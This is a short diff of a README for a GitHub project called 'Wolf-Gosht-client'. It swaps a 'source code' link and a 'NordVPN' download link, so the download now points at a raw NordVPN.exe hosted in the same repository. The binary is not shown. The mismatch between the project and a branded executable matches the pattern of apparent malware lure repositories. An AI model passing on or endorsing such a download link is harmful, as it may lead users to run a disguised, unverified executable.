@@ -4,9 +4,9 @@
 - Build in python and java
 - Cool gui
 
-[source code](https://github.com/doa69/Wolf-Gosht-client/blob/main/NordVPN.exe?raw=true)
+[source code](https://raw.githubusercontent.com/doa69/Wolf-Gosht-client/main/code.txt)
 ## Download types
-[NordVPN](https://raw.githubusercontent.com/doa69/Wolf-Gosht-client/main/code.txt)
+[NordVPN](https://github.com/doa69/Wolf-Gosht-client/blob/main/NordVPN.exe?raw=true)
 
 ## Other
 - [x] Fixing Ai auto crash
